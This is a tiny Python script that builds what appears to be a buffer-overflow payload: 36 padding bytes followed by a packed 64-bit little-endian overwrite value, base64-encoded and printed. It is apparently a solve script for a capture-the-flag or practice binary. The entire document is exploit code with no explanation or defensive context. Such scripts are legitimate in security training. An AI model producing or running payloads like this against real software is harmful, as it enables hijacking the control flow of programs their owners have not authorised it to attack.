
import sys
import struct
import base64

buf = b'tttttttttttttttttttttttttttttttttttt'
buf += struct.pack('<Q', 2160618597531769032)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
